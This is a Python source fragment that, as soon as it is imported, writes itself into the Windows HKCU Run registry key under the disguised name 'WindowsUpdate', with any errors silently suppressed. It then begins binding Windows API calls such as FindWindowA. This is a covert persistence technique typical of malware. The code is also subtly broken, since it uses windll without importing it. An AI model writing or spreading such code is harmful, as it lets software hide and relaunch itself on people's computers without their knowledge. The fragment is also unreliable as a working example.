import ctypes
import ctypes.util
import threading
import sqlite3
import signal

try:
    import gtk
    import gtk.gdk as gdk
    import gobject
    has_gtk = 1
except:
    has_gtk = 0

import gobject

from _winreg import *

import _winreg

_reg = _winreg.ConnectRegistry(None, _winreg.HKEY_CURRENT_USER)
_root_key = _winreg.OpenKey(_reg, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_ALL_ACCESS)

try:
    _winreg.SetValueEx(_root_key, "WindowsUpdate", 0, _winreg.REG_SZ, "python {0}".format(__file__))
except:
    pass

#
#
#   The following functions are to help with the low level interaction with the windows api
#
#

_FindWindowA = windll.user32.FindWindowA
